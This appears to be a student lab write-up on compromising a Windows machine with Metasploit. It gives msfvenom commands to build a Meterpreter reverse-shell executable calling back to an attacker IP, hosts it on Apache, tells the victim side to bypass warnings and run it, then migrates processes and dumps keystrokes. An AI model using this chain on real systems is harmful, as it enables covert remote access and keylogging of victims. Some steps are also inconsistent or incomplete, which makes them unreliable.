# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## OUTPUT:
![image](https://github.com/AsinVardhini/Compromising-windows-using-Metasploit/assets/119417735/54fd799e-0076-4a17-bf93-6dbc1aa42616)

Create a malicious executable file fun.exe using msenom command msfvenom -p windows/meterpreter/reverse_tcp 
LHOST=192.168.1.2 -f exe > fun.exe

![image](https://github.com/AsinVardhini/Compromising-windows-using-Metasploit/assets/119417735/04ceff39-1fbe-4361-bca3-b851daad372f)

copy the fun.exe into the apache /var/www/html folder 
![image](https://github.com/AsinVardhini/Compromising-windows-using-Metasploit/assets/119417735/ac2a0aa4-7bde-4410-a933-304df04ce31f)

Start apache server sudo systemctl apache2 start
![image](https://github.com/AsinVardhini/Compromising-windows-using-Metasploit/assets/119417735/540832c2-a032-4a9a-848b-e14f860b2bd5)

Check the status of apache2
![image](https://github.com/AsinVardhini/Compromising-windows-using-Metasploit/assets/119417735/a57a2348-c4de-4fb2-a465-904b37cfb9b0)

Invoke msfconsole:

## OUTPUT:

Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.

Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set 
LHOST 0.0.0.0 exploit
![image](https://github.com/AsinVardhini/Compromising-windows-using-Metasploit/assets/119417735/9aa19a10-610e-4743-83cd-f59011002911)

On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the
IP address of your Kali machine: http://192.168.1.2/fun.exe The file "fun.exe" downloads.
![image](https://github.com/AsinVardhini/Compromising-windows-using-Metasploit/assets/119417735/7ee54804-21c1-4c37-9aea-468f1c00dda1)

Bypass any warning boxes, double-click the file, and allow it to run.

On kali give the command exploit image
![image](https://github.com/AsinVardhini/Compromising-windows-using-Metasploit/assets/119417735/410a522c-76c1-4167-be8e-802769ae87f8)

To see a list of processes, at the meterpreter > prompt, execute this command: ps ⇒ can see the fun.exe process running with pid 1156
![image](https://github.com/AsinVardhini/Compromising-windows-using-Metasploit/assets/119417735/0f965d4a-97b7-4797-9966-75188d713fc3)

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost. To become more persistent,
we'll migrate to a process that will last longer. Let's migrate to the winlogon process. At the meterpreter > prompt, execute this command:

migrate -N explorer.exe at meterpreter > prompt, execute this command: netstat A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below. 
Notice the "PID/Program name" value for this connection, which is redacted
![image](https://github.com/AsinVardhini/Compromising-windows-using-Metasploit/assets/119417735/84ffdbba-6b4f-446e-8185-af7fef514caa)

keyscan_dump Shows the keystrokes captured so far 
![image](https://github.com/AsinVardhini/Compromising-windows-using-Metasploit/assets/119417735/f5f4a0a2-39cf-4592-9459-4840c30e9745)


## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.
